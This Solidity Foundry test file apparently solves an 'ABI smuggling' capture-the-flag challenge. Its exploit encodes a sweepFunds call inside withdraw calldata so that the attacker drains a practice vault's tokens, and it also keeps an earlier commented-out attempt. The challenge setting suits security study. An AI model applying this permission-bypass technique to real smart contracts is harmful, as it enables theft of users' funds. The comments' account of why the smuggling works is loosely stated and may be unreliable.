// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2, console} from "forge-std/Test.sol";
import {AuthorizedExecutor} from "../src/AuthorizedExecutor.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";

import {UtilsTest} from "./Utils.t.sol";

contract SelfAuthorizedVaultTest is UtilsTest {
    bytes32[] ids = new bytes32[](1);
    address attackerAddress = makeAddr("attacker Address");

    function setUp() public override {
        super.setUp();
    }

    function test_vaultFunds() public {
        token.balanceOf(address(vault));

        assertEq(token.balanceOf(address(vault)), 1000000 ether);
        assertEq(token.balanceOf(address(token)), 0 ether);
    }

    function test_setPermission() public {}

    // function test_Attack() public {
    //     // Allow withdraw
    //     ids[0] = keccak256(
    //         abi.encode(
    //             vault.withdraw.selector,
    //             address(token),
    //             address(vault),
    //             1 ether
    //         )
    //     );
    //     vault.setPermissions(ids);

    //     // Build malicious payload
    //     bytes memory innerCall = abi.encodeWithSelector(
    //         vault.sweepFunds.selector,
    //         attackerAddress,
    //         address(token)
    //     );

    //     bytes memory actionData = abi.encodeWithSelector(
    //         vault.withdraw.selector,
    //         attackerAddress,
    //         address(vault),
    //         innerCall // smuggled here
    //     );

    //     // Execute exploit
    //     vm.startPrank(attackerAddress);
    //     vault.execute(address(vault), actionData);
    //     vm.stopPrank();
    // }

    function test_Attack() public {
        ids[0] = keccak256(
            abi.encodePacked(
                vault.withdraw.selector,
                attackerAddress, // executor
                address(vault) // target
            )
        );
        vault.setPermissions(ids);

        // Build malicious payload - ABI smuggling attack
        // Permission check sees withdraw.selector, but memory layout causes sweepFunds to execute
        bytes memory innerCall = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            attackerAddress,
            address(token)
        );

        bytes memory actionData = abi.encodeWithSelector(
            vault.withdraw.selector,
            attackerAddress,
            address(vault),
            innerCall // smuggled here - memory miscalculation causes this to be executed instead
        );

        // Execute exploit - permission allows withdraw but memory layout executes sweepFunds
        vm.startPrank(attackerAddress);
        vault.execute(address(vault), actionData);
        vm.stopPrank();
    }
}
